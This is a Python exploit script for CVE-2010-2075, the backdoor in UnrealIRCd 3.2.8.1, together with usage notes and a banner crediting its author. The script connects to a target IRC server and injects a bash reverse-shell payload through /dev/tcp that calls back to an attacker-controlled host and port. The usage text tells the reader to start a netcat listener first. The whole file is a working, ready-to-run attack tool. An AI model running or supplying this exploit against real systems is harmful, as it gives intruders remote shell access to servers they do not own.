
import argparse
import socket
import time

"""
 [ USAGE ] :

[*] start a netcat listener on the same lport you will give as a parameter to the program
	==> nc -lvnp <port> .... eg : nc -lvnp 5555
[*] Run Unreal-IRC-RCE.py with required arguments with python3 ! 
	==> python3 Unreal-IRC-RCE.py -lh 10.10.14.23 -lp 5555 -rh 10.10.10.117 -rp 8067

[*] After that just wait for a few seconds and you will receive the shell on your listening port ! 

"""

banner="""
 _   _                      _      ___ ____    ____     _____  ____    ___   _ 
| | | |_ __  _ __ ___  __ _| |    |_ _|  _ \  / ___|   |___ / |___ \  ( _ ) / |
| | | | '_ \| '__/ _ \/ _` | |_____| || |_) || |   _____ |_ \   __) | / _ \ | |
| |_| | | | | | |  __/ (_| | |_____| ||  _ <|| |__|_____|__) | / __/ | (_) || |
 \___/|_| |_|_|  \___|\__,_|_|    |___|_| \_\ \____|   |____(_)_____(_)___(_)_|
================================================================================                                                                       
[*] Unreal IRC Backdoor Remote command Execution (3.2.8.1)
[*] CVE : 2010-2075
[*] Reference : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075
[*] Code by : NullByte007
[*] Github : https://github.com/NullByte007
================================================================================
"""

def exploit(lhost,lport,rhost,rport):
	try:
		s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
		s.connect((rhost,rport))
		data = s.recv(1024)
		payload = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(lhost,lport)
		print("[*] Sending Payload......... ")
		s.send("AB; ".encode() + payload.encode() + '\n'.encode())
		s.close()
		print("[*] Payload Sent ! ")
		print("[*] Spawning shell ! ")
		time.sleep(5)
	except:
		print("ERROR ! Unable to connect !")

def main():
	parser = argparse.ArgumentParser("Remote Command Execution using backdoor for Unreal IRC Server Version 3.2.8.1\n")
	parser.add_argument('-lh','--lhost',metavar=' ' , required=True, help='Local Host Address')
	parser.add_argument('-lp','--lport',metavar=' ' , required=True, help='Local Port to listen on')
	parser.add_argument('-rh','--rhost',metavar=' ' , required=True, help='Remote Host Address')
	parser.add_argument('-rp','--rport',metavar=' ' , required=True, help='IRC Server Port')

	args = parser.parse_args()
	print(banner)
	exploit(args.lhost,int(args.lport),args.rhost,int(args.rport))


if __name__=='__main__':
	main()

